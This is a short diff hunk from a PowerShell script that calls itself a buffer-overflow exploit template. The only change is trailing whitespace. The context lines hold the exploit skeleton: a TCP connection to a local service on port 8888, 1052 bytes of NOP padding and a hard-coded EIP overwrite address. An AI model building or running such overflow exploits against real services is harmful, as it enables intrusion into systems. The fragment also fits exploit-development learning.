@@ -4,7 +4,7 @@
 # This script can be updated to BoF exploit remote and local services. 
 
 $tcpClient = New-Object System.Net.Sockets.TCPClient
-$tcpClient.Connect("127.0.0.1","8888") # Connect to internal service
+$tcpClient.Connect("127.0.0.1","8888") # Connect to internal service 
 
 [Byte[]] $Padding = [Byte[]] (0x90) * 1052 
 [Byte[]] $EIP = [Byte[]] (0xB5,0x42,0xA8,0x68)
